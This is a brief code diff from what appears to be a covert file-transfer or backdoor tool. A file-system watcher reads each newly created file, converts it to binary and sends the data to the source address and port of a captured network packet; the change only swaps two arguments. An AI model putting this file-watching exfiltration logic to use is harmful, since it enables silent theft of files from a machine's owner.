@@ -29,7 +29,7 @@ class NewFileHandler(FileSystemEventHandler):
 		filename = os.path.basename(event.src_path)
 		f_binary = file_to_binary(filename, event.src_path)
 		encrypted_data = ''.join(f_binary)
-		send_data(encrypted_data, self.packet[2].sport, self.packet[1].src, "write")
+		send_data(encrypted_data,  self.packet[1].src, self.packet[2].sport, "write")
 		MONITOR = 1
 
 
